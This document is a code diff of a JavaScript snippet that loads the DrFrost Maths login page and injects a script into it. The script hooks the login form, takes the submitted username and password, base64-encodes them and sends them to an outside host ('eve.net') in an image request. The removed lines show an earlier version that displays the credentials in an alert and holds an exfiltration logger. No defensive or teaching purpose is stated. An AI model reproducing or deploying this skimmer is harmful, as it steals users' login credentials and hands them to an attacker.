@@ -1,26 +1,16 @@
-(function() {
-  let comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
-  let bin = 'https://???/bin?data='
-
-  let load = async path => document.write(
-    await fetch(path)
+(async () => 
+  document.write(
+    await fetch(`/login.php?url=${encodeURIComponent('/do-question.php?aaid=10972720')}`)
     .then(response => response.text())
     .then(text => text + `
       <script>
         setTimeout(() => {
-          $('form[action*=login]').submit(event => {
-            alert(event.currentTarget[0].value + ' | ' + event.currentTarget[1].value)
-          }); 
-          console.log('hooked')
+          $('form[action*=login]').submit(({currentTarget}) => {
+            a = currentTarget
+            new Image.src = '//eve.net/' + btoa(a[0].value) + '/' + btoa(a[1].value)
+          })
         }, 4000)
       </script>
     `)
   )
-
-  let log = data => {
-    new Image()
-    .src = `${bin}${btoa(JSON.stringify(data))}`
-  }
-  
-  load(`/login.php?url=${encodeURIComponent(comfort)}`)
 })()
